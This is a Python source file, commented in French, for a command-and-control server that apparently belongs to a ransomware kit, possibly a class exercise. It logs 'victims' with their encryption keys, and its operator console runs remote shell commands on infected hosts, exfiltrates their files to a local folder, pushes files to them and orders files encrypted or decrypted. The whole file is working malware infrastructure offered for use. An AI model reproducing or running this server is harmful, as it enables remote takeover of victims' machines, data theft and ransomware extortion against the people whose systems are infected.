import socket
import json
import threading
import os
import time

IP_BIND = "0.0.0.0"
PORT = 5000
DB_FILE = "victims.json"
STORAGE_DIR = "./exfiltrated_files" # Dossier pour stocker les fichiers reçus

if not os.path.exists(STORAGE_DIR): os.makedirs(STORAGE_DIR)
active_clients = {}

def save_to_db(uuid, key, addr):
    db = {}
    if os.path.exists(DB_FILE):
        try:
            with open(DB_FILE, "r") as f: db = json.load(f)
        except: db = {}
    db[uuid] = {"key": key, "ip": addr, "last_seen": time.strftime('%Y-%m-%d %H:%M:%S')}
    with open(DB_FILE, "w") as f: json.dump(db, f, indent=4)

def handle_client(conn, addr):
    try:
        data = conn.recv(4096).decode('utf-8')
        if not data: return
        info = json.loads(data)
        v_id = info.get('id')
        v_key = info.get('key')
        
        print(f"\n[!] VICTIME CONNECTÉE : {v_id} ({addr[0]})")
        save_to_db(v_id, v_key, addr[0])
        active_clients[v_id] = conn
    except Exception as e:
        print(f"[!] Erreur initialisation client {addr}: {e}")

def server_console():
    while True:
        choice = input("\nC2-ADMIN (list/exec/upload/download/crypt/decrypt/exit) > ").strip().split(" ")
        cmd = choice[0]

        if cmd == "list":
            print(f"Clients actifs : {list(active_clients.keys())}")
        
        elif cmd == "exec" and len(choice) >= 3:
            # Usage: exec <uuid> <command>
            v_id, sys_cmd = choice[1], " ".join(choice[2:])
            if v_id in active_clients:
                active_clients[v_id].send(f"EXEC|{sys_cmd}".encode())
                # Récupération du retour de la commande (Sortie Standard)
                result = active_clients[v_id].recv(8192).decode()
                print(f"\n--- RETOUR COMMANDE ---\n{result}\n-----------------------")
            
        elif cmd == "upload" and len(choice) >= 3:
            # Envoyer un fichier du client vers le serveur
            v_id, remote_path = choice[1], choice[2]
            if v_id in active_clients:
                active_clients[v_id].send(f"UPLOAD|{remote_path}".encode())
                file_data = active_clients[v_id].recv(1024*1024*10) # Max 10Mo pour le TP
                if not file_data.startswith(b"ERROR"):
                    filename = os.path.basename(remote_path)
                    with open(os.path.join(STORAGE_DIR, f"{v_id}_{filename}"), "wb") as f:
                        f.write(file_data)
                    print(f"[OK] Fichier exfiltré dans {STORAGE_DIR}")
                else: print(file_data.decode())

        elif cmd == "download" and len(choice) >= 3:
            # Envoyer un fichier du serveur vers le client
            v_id, local_path = choice[1], choice[2]
            if v_id in active_clients and os.path.exists(local_path):
                filename = os.path.basename(local_path)
                with open(local_path, "rb") as f: data = f.read()
                active_clients[v_id].send(f"DOWNLOAD|{filename}".encode())
                time.sleep(1) # Petit délai pour la synchro
                active_clients[v_id].sendall(data)
                print(f"[OK] Fichier {filename} envoyé au client.")

        elif cmd in ["crypt", "decrypt"] and len(choice) >= 2:
            v_id = choice[1]
            if v_id in active_clients:
                active_clients[v_id].send(cmd.upper().encode())
                print(f"[*] Ordre de {cmd} envoyé.")
        
        elif cmd == "exit": os._exit(0)

def start_server():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((IP_BIND, PORT))
    s.listen(10)
    print(f"[*] C2 Multi-fonctions prêt sur le port {PORT}")
    threading.Thread(target=server_console, daemon=True).start()
    while True:
        c, a = s.accept()
        threading.Thread(target=handle_client, args=(c, a)).start()

if __name__ == "__main__": start_server()
